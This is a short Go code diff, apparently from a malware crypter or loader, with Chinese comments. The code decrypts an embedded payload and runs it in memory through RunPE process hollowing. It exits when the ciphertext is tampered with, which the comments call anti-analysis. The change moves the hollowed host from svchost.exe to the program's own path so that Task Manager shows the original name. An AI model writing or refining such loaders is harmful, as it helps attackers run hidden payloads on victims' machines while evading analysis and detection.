@@ -74,9 +74,10 @@ func main() {
 		os.Exit(1) // 密文损坏或被篡改，防分析
 	}
 
-	// 4. 执行内存加载 (RunPE)，此方法现已改为阻塞执行
-	targetHost := "C:\\Windows\\System32\\svchost.exe"
-	err = loader.Execute(targetHost, decryptedPayload)
+	// 4. 执行内存加载 (RunPE)
+	// 🌟 核心修改点：将傀儡宿主从 svchost.exe 替换为 exePath (自身路径)
+	// 这样不仅能完美读取同目录下的配置文件，还能让任务管理器里显示的名字也是您原本的程序名！
+	err = loader.Execute(exePath, decryptedPayload)
 	if err != nil {
 		os.Exit(1)
 	}
